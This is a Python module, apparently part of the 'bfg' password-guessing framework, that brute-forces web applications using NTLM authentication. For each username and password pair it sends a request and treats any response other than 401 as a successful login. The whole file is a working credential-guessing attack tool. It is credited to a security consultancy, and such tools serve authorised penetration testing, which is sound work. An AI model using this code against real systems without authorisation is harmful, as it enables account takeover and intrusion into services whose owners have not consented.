import warnings
warnings.filterwarnings('ignore')
import requests
from requests_ntlm import HttpNtlmAuth
from bfg.args import http as http_args
from bfg.shortcuts.http import HTTPModule, handleUA

class Module(HTTPModule):

    description = 'This module allows one to brute force web ' \
            'applicaitons using basic NTLM authentication.'
    brief_description = 'Generic HTTP basic NTLM authentication'
    args = http_args.getDefaults()
    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    @handleUA
    def __call__(self,username,password,*args,**kwargs):
    
        # make the request
        resp = requests.get(self.url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    proxies=self.proxies,
                    auth=HttpNtlmAuth(
                        username,
                        password
                    )
                )

        # verify credentials and return outcome
        if resp.status_code == 401:
            return dict(outcome=0, username=username, password=password)
        else:
            return dict(outcome=1, username=username, password=password)
